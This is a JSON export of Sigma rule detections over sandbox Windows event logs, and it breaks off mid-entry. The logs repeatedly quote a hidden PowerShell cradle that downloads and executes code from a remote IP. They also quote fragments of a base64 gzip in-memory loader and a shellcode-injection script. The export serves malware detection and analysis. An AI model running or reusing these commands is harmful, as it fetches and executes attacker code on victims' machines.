                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "355b439d3a90c89090f6f266afd2306ad6a03e5ca79228ad1be6e9cb6940491b",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Invocations - Specific - PowerShell Module",
                                                                       "rule_description":  "Detects suspicious PowerShell invocation command parameters",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Jonhnathan Ribeiro",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Payload=CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"net.webclient\"\r\n; UserData=; EventID=4103; ContextInfo=        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.17134.858\r\n        Host ID = fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n        Engine Version = 5.1.17134.858\r\n        Runspace ID = de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n        Pipeline ID = 1\r\n        Command Name = New- [TRUNCATED]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ContextInfo=        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.17134.858\r\n        Host ID = fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n        Engine Version = 5.1.17134.858\r\n        Runspace ID = de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n        Pipeline ID = 1\r\n        Command Name = New- [TRUNCATED]; UserData=; Payload=CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"IO.MemoryStream\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"System.Byte[]\"\r\n; EventID=4103}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Payload=CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"IO.Compression.GzipStream\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"System.IO.MemoryStream, Decompress\"\r\n; UserData=; EventID=4103; ContextInfo=        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.17134.858\r\n        Host ID = fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n        Engine Version = 5.1.17134.858\r\n        Runspace ID = de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n        Pipeline ID = 1\r\n        Command Name = New- [TRUNCATED]}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=4103; UserData=; ContextInfo=        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.17134.858\r\n        Host ID = fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n        Engine Version = 5.1.17134.858\r\n        Runspace ID = de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n        Pipeline ID = 1\r\n        Command Name = New- [TRUNCATED]; Payload=CommandInvocation(New-Object): \"New-Object\"\r\nParameterBinding(New-Object): name=\"TypeName\"; value=\"IO.StreamReader\"\r\nParameterBinding(New-Object): name=\"ArgumentList\"; value=\"System.IO.Compression.GZipStream\"\r\n}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Payload=CommandInvocation(Set-StrictMode): \"Set-StrictMode\"\r\nParameterBinding(Set-StrictMode): name=\"Version\"; value=\"2.0\"\r\n; UserData=; EventID=4103; ContextInfo=        Severity = Informational\r\n        Host Name = ConsoleHost\r\n        Host Version = 5.1.17134.858\r\n        Host ID = fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n        Host Application = C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n        Engine Version = 5.1.17134.858\r\n        Runspace ID = de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n        Pipeline ID = 1\r\n        Command Name = Set- [TRUNCATED]}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "7d262d8417cb03b2a9d2b935ae55980f22abc3aa7cffc36e57eda761068226dc",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Invocations - Specific",
                                                                       "rule_description":  "Detects suspicious PowerShell invocation command parameters",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Jonhnathan Ribeiro",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027)); Path=; ScriptBlockId=724860cb-4277-4ef1-aba6-ba49835fe232; MessageTotal=\u0001; EventID=4104; MessageNumber=\u0001}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027)); Path=; ScriptBlockId=870127ab-0fd6-4f8c-a830-da1f5d0c6880; MessageTotal=1; MessageNumber=1; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "bdb4652f83b1c4482478b0c14bcb08d332fcd600a7303ab1c709c543499be726",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Download and Execute Pattern",
                                                                       "rule_description":  "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\\Users\\george\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft Windows Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=\"C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe\"; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe; IntegrityLevel=High; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "bdb4652f83b1c4482478b0c14bcb08d332fcd600a7303ab1c709c543499be726",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Download and Execute Pattern",
                                                                       "rule_description":  "Detects suspicious PowerShell download patterns that are often used in malicious scripts, stagers or downloaders (make sure that your backend applies the strings case-insensitive)",
                                                                       "rule_author":  "Florian Roth",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=5240FBE6-DADD-62BD-AD00-000000002400; ProcessId=2872; Product=Microsoft Windows Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid=5240FBE6-DACE-62BD-9800-000000002400; User=work\\admin; Hashes=MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.14409.1005 (rs1_srvoob.161208-1155); ParentProcessId=2312; CurrentDirectory=C:\\Users\\admin\\Downloads\\; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; EventID=1; LogonGuid=5240FBE6-DA52-62BD-191B-010000000000; LogonId=72473; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk; UtcTime=2022-06-30 17:18:21.312; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e4d5f1be0673fa786cc8379c15338af08cdd11eed433bead9e801d6204d42a2d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Python Initiated Connection",
                                                                       "rule_description":  "Adversaries may attempt to get a listing of services running on remote hosts, including those that may be vulnerable to remote software exploitation",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=576; DestinationPortName=-; SourceIsIpv6=false; DestinationIp=255.255.255.255; Initiated=true; SourcePortName=-; Image=C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe; RuleName=Usermode; DestinationHostname=-; UtcTime=2022-06-30 17:17:58.954; User=work\\admin; DestinationPort=12345; ProcessGuid=5240FBE6-DABD-62BD-3B00-000000002400; SourcePort=59421; Protocol=udp; SourceHostname=-; SourceIp=192.168.122.246; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=576; DestinationPortName=-; SourceIsIpv6=false; Initiated=true; DestinationIp=142.250.98.153; SourcePortName=-; Image=C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe; RuleName=Usermode; DestinationHostname=-; UtcTime=2022-06-30 17:18:14.288; User=work\\admin; DestinationPort=443; ProcessGuid=5240FBE6-DABD-62BD-3B00-000000002400; SourcePort=49166; Protocol=tcp; SourceHostname=-; SourceIp=192.168.122.246; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=576; DestinationPortName=-; SourceIsIpv6=false; DestinationIp=142.250.98.153; Initiated=true; SourcePortName=-; Image=C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe; RuleName=Usermode; DestinationHostname=-; UtcTime=2022-06-30 17:18:20.102; User=work\\admin; DestinationPort=443; ProcessGuid=5240FBE6-DABD-62BD-3B00-000000002400; SourcePort=49170; Protocol=tcp; SourceHostname=-; SourceIp=192.168.122.246; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=576; DestinationPortName=-; SourceIsIpv6=false; Initiated=true; DestinationIp=142.250.98.153; SourcePortName=-; Image=C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe; RuleName=Usermode; DestinationHostname=-; UtcTime=2022-06-30 17:18:21.998; User=work\\admin; DestinationPort=443; ProcessGuid=5240FBE6-DABD-62BD-3B00-000000002400; SourcePort=49171; Protocol=tcp; SourceHostname=-; SourceIp=192.168.122.246; DestinationIsIpv6=false}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{EventID=3; ProcessId=576; DestinationPortName=-; SourceIsIpv6=false; DestinationIp=142.250.98.153; Initiated=true; SourcePortName=-; Image=C:\\Users\\admin\\AppData\\Local\\Programs\\Python\\Python37\\pythonw.exe; RuleName=Usermode; DestinationHostname=-; UtcTime=2022-06-30 17:18:22.340; User=work\\admin; DestinationPort=443; ProcessGuid=5240FBE6-DABD-62BD-3B00-000000002400; SourcePort=49172; Protocol=tcp; SourceHostname=-; SourceIp=192.168.122.246; DestinationIsIpv6=false}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Download and Execution Cradles",
                                                                       "rule_description":  "Detects PowerShell download and execution cradles.",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\\Users\\george\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft Windows Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe\"; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; EventID=1; ParentImage=C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe; IntegrityLevel=High; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "high",
                                                                       "rule_id":  "e88280a32f81c8575c3cb9b02910d867498fbf28ca75ca922ad991faa3a68879",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download and Execution",
                                                                       "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                                       "rule_author":  "Florian Roth",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{TerminalSessionId=1; ProcessGuid=5240FBE6-DADD-62BD-AD00-000000002400; ProcessId=2872; Product=Microsoft Windows Operating System; Description=Windows PowerShell; Company=Microsoft Corporation; ParentProcessGuid=5240FBE6-DACE-62BD-9800-000000002400; User=work\\admin; Hashes=MD5=A575A7610E5F003CC36DF39E07C4BA7D,SHA256=006CEF6EF6488721895D93E4CEF7FA0709C2692D74BDE1E22E2A8719B2A86218,IMPHASH=CAEE994F79D85E47C06E5FA9CDEAE453; OriginalFileName=PowerShell.EXE; ParentImage=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; FileVersion=10.0.14409.1005 (rs1_srvoob.161208-1155); ParentProcessId=2312; CurrentDirectory=C:\\Users\\admin\\Downloads\\; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; EventID=1; LogonGuid=5240FBE6-DA52-62BD-191B-010000000000; LogonId=72473; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; IntegrityLevel=High; ParentCommandLine=c:/windows/system32/WindowsPowerShell/v1.0/powershell.exe start-process ??:??????.lnk; UtcTime=2022-06-30 17:18:21.312; RuleName=-}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "0c6e3c35fbd166dc96fbf3faf4f052230a9cc9db642ee3bee40f5c94d5938d03",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious PowerShell Download",
                                                                       "rule_description":  "Detects suspicious PowerShell download command",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=13\n\n\tHostName=ConsoleHost\n\tHostVersion=5.1.17134.858\n\tHostId=fa529a7a-b757-49b7-9c72-ae8666c848b2\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=de465c61-d1a2-4e3f-be0d-8be4d27f28e1\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommandP [TRUNCATED]; EventID=400}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Data=[Available None \tNewEngineState=Available\n\tPreviousEngineState=None\n\n\tSequenceNumber=41\n\n\tHostName=Default Host\n\tHostVersion=5.1.17134.858\n\tHostId=f20e45d5-f1e7-470f-a278-683b8d533be6\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\n\tEngineVersion=5.1.17134.858\n\tRunspaceId=0e2ad967-c024-416b-93a5-3ce487c5194f\n\tPipelineId=\n\tCommandName=\n\tCommandType=\n\tScriptName=\n\tCommand [TRUNCATED]; EventID=400}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Data=[Available None \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=13\r\n\r\n\tHostName=ConsoleHost\r\n\tHostVersion=5.1.17134.858\r\n\tHostId=fa529a7a-b757-49b7-9c72-ae8666c848b2\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n\tEngineVersion=5.1.17134.858\r\n\tRunspaceId=de465c61-d1a2-4e3f-be0d-8be4d27f28e1\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScriptN [TRUNCATED]; EventID=400}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{Data=[Available None \tNewEngineState=Available\r\n\tPreviousEngineState=None\r\n\r\n\tSequenceNumber=41\r\n\r\n\tHostName=Default Host\r\n\tHostVersion=5.1.17134.858\r\n\tHostId=f20e45d5-f1e7-470f-a278-683b8d533be6\r\n\tHostApplication=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe -nop -w hidden -c IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\r\n\tEngineVersion=5.1.17134.858\r\n\tRunspaceId=0e2ad967-c024-416b-93a5-3ce487c5194f\r\n\tPipelineId=\r\n\tCommandName=\r\n\tCommandType=\r\n\tScript [TRUNCATED]; EventID=400}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "24c9049c81b149aa4537cce166e36f3697878dcdad3fab8b662889d154056d7c",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Download Pattern",
                                                                       "rule_description":  "Detects a Powershell process that contains download commands in its command line string",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), oscd.community, Jonhnathan Ribeiro",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\\Users\\george\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft Windows Operating System; Description=Windows PowerShell; EventID=1; ParentCommandLine=\"C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe\"; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentImage=C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe; IntegrityLevel=High; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "4c7e768ac31ad9f19aa32c2c10eb81eb9b6ae9d00129f474125bbfa6e8cf42ae",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Suspicious FromBase64String Usage On Gzip Archive - Ps Script",
                                                                       "rule_description":  "Detects attempts of decoding a base64 Gzip archive in a PowerShell script. This technique is often used as a method to load malicious content into memory afterward.",
                                                                       "rule_author":  "frack113",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String(\"H4sIAAAAAAAAAOy9W6/ySLIg+tz9K+phS1UlajcGgzEjbWnA3GxsczEXQ0+rBTYYG7DxDZOeM//9REQa1vqqau9pzbwdne/TEr5lOjMyMu4Rtk7Zv1tZ4juZEbmnn/59c0pSPwp/av71r/82iNTsp//46b///NdzHjoZXsaDf3qn7J+PJHL+eXDd5JSmP/3Pv/5lfkgO959++bfnIfnnPXLz2+m3n+gEHzy5eXL69S9/+etf6FIepofz6Z/hIfOfp3/eT9klclN40S9/7z0eg+h+8MN//Lf/puRJcgozfv638Snrpenpfrz5p/SXX3/6f37aXk7J6d9nx+DkZD/9z5/+7Z9/G9+i4+FWPcaUg3OBCfVCF+/pkXPAGfzNetz87Jef/8f/+PnXv/974x9/G8b54Zb+8rPF0ux0/5t7u/3860//61d84Yo9 [TRUNCATED]; MessageTotal=\u0013; ScriptBlockId=abad4e98-7ffd-4ea9-a045-35585c7f84d7; Path=; MessageNumber=\u0001; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "5bd56545b7e384edee75e378b7ee025e05f6bcb012607cb6425ccedd54fdb070",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Malicious PowerShell Keywords",
                                                                       "rule_description":  "Detects keywords from well-known PowerShell exploitation frameworks",
                                                                       "rule_author":  "Sean Metcalf (source), Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=Set-StrictMode -Version 2\n\n$DoIt = @\u0027\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(\u0027\\\\\u0027)[-1].Equals(\u0027System.dll\u0027) }).GetType(\u0027Microsoft.Win32.UnsafeNativeMethods\u0027)\n\t$var_gpa = $var_unsafe_native_methods.GetMethod(\u0027GetProcAddress\u0027, [Type[]] @(\u0027System.Runtime.InteropServices.HandleRef\u0027, \u0027string\u0027))\n\treturn $var_gpa.Invoke($null, @([Syste [TRUNCATED]; Path=; ScriptBlockId=409092b5-3e84-4793-bdcd-029e12fbdd3f; MessageTotal=\u0013; EventID=4104; MessageNumber=\u0001}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "6291f85314c7d9966be831c56d3cdfb30f42c84f599273e73dac5c95e1122abf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Usage Of Web Request Commands And Cmdlets - ScriptBlock",
                                                                       "rule_description":  "Detects the use of various web request commands with commandline tools and Windows PowerShell cmdlets (including aliases) via PowerShell scriptblock logs",
                                                                       "rule_author":  "James Pemberton / @4A616D6573",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027)); MessageTotal=\u0001; ScriptBlockId=724860cb-4277-4ef1-aba6-ba49835fe232; Path=; EventID=4104; MessageNumber=\u0001}"
                                                                                             },
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027)); Path=; ScriptBlockId=870127ab-0fd6-4f8c-a830-da1f5d0c6880; MessageTotal=1; MessageNumber=1; EventID=4104}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "a5f575ade1f2aaba452086d3418d8a893e94b28e30da42ad98b58df4a4fe9c2d",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "Potential Suspicious PowerShell Keywords",
                                                                       "rule_description":  "Detects potentially suspicious keywords that could indicate the use of a PowerShell exploitation framework",
                                                                       "rule_author":  "Florian Roth (Nextron Systems), Perez Diego (@darkquassar), Tuan Le (NCSGroup)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{ScriptBlockText=Set-StrictMode -Version 2\n\n$DoIt = @\u0027\nfunction func_get_proc_address {\n\tParam ($var_module, $var_procedure)\t\t\n\t$var_unsafe_native_methods = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split(\u0027\\\\\u0027)[-1].Equals(\u0027System.dll\u0027) }).GetType(\u0027Microsoft.Win32.UnsafeNativeMethods\u0027)\n\t$var_gpa = $var_unsafe_native_methods.GetMethod(\u0027GetProcAddress\u0027, [Type[]] @(\u0027System.Runtime.InteropServices.HandleRef\u0027, \u0027string\u0027))\n\treturn $var_gpa.Invoke($null, @([Syste [TRUNCATED]; Path=; ScriptBlockId=409092b5-3e84-4793-bdcd-029e12fbdd3f; MessageTotal=\u0013; EventID=4104; MessageNumber=\u0001}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download",
                                                                       "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                                       "rule_author":  "Florian Roth (Nextron Systems)",
                                                                       "match_context":  [
                                                                                             {
                                                                                                 "values":  "@{Hashes=MD5=95000560239032BC68B4C2FDFCDEF913,SHA256=D3F8FADE829D2B7BD596C4504A6DAE5C034E789B6A3DEFBE013BDA7D14466677,IMPHASH=741776AACCFC5B71FF59832DCDCACE0F; CurrentDirectory=C:\\Users\\george\\Desktop\\; OriginalFileName=PowerShell.EXE; Product=Microsoft Windows Operating System; Description=Windows PowerShell; FileVersion=10.0.17134.1 (WinBuild.160101.0800); ParentCommandLine=\"C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe\"; CommandLine=\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" -nop -w hidden -c \"IEX ((new-object net.webclient).downloadstring(\u0027http://120.48.85.228:80/favicon\u0027))\"; EventID=1; ParentImage=C:\\Program Files (x86)\\Joebox\\control\\joeboxcontrol.exe; IntegrityLevel=High; Image=C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe; Company=Microsoft Corporation}"
                                                                                             }
                                                                                         ]
                                                                   },
                                                                   {
                                                                       "rule_level":  "medium",
                                                                       "rule_id":  "dac677b84d14788387f1c92fd6733396974f070639fca6be1bbf50df44b426cf",
                                                                       "rule_source":  "Sigma Integrated Rule Set (GitHub)",
                                                                       "rule_title":  "PowerShell Web Download",
                                                                       "rule_description":  "Detects suspicious ways to download files or content using PowerShell",
                                                                       "rule_author":  "Florian Roth",
                                                                       "match_context":  [
                                                                                             {
